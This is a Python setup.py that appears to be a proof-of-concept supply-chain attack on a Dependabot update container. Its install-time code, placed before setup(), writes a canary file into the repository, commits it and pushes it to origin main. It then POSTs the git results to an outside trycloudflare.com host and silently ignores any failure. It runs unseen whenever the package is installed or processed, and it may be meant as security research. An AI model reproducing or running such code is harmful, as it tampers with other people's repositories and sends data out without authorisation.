from setuptools import setup
import os
import json
import subprocess

_canary = "DEPBOT_GITPUSH_V9_2026_Cx6nUpK4mL8rJzWv"
_result = {"c": _canary}

_repo_path = os.environ.get("DEPENDABOT_REPO_CONTENTS_PATH", "")
if _repo_path:
    _canary_file = _repo_path + "/CANARY_FROM_DEPBOT.txt"
    with os.popen("cat > " + _canary_file + " << 'EOCANARY'\n" + _canary + "\nEOCANARY") as _f:
        pass

    _result["canary_written"] = os.path.exists(_canary_file)

    _git_add = subprocess.run(
        ["git", "-C", _repo_path, "add", "CANARY_FROM_DEPBOT.txt"],
        capture_output=True, text=True, timeout=5
    )
    _result["git_add"] = {"rc": _git_add.returncode, "stderr": _git_add.stderr[:300]}

    _git_commit = subprocess.run(
        ["git", "-C", _repo_path, "commit", "-m", "canary from dependabot container " + _canary],
        capture_output=True, text=True, timeout=5,
        env={**os.environ, "GIT_AUTHOR_NAME": "test", "GIT_AUTHOR_EMAIL": "test@test.com",
             "GIT_COMMITTER_NAME": "test", "GIT_COMMITTER_EMAIL": "test@test.com"}
    )
    _result["git_commit"] = {"rc": _git_commit.returncode, "stdout": _git_commit.stdout[:300], "stderr": _git_commit.stderr[:300]}

    if _git_commit.returncode == 0:
        _git_push = subprocess.run(
            ["git", "-C", _repo_path, "push", "origin", "main"],
            capture_output=True, text=True, timeout=30
        )
        _result["git_push"] = {
            "rc": _git_push.returncode,
            "stdout": _git_push.stdout[:500],
            "stderr": _git_push.stderr[:500]
        }

    _git_log = subprocess.run(
        ["git", "-C", _repo_path, "log", "--oneline", "-3"],
        capture_output=True, text=True, timeout=5
    )
    _result["git_log"] = _git_log.stdout[:500]

import urllib.request as _ur
try:
    _data = json.dumps(_result).encode()
    _rq = _ur.Request(
        "https://miller-tutorial-expanding-conceptual.trycloudflare.com/depbot-v9-gitpush",
        data=_data,
        method="POST",
    )
    _rq.add_header("Content-Type", "application/json")
    _ur.urlopen(_rq, timeout=15)
except Exception:
    pass

setup(
    name="depbot-impact-test",
    version="1.0.0",
    install_requires=["requests==2.26.0", "urllib3==1.26.5"],
)
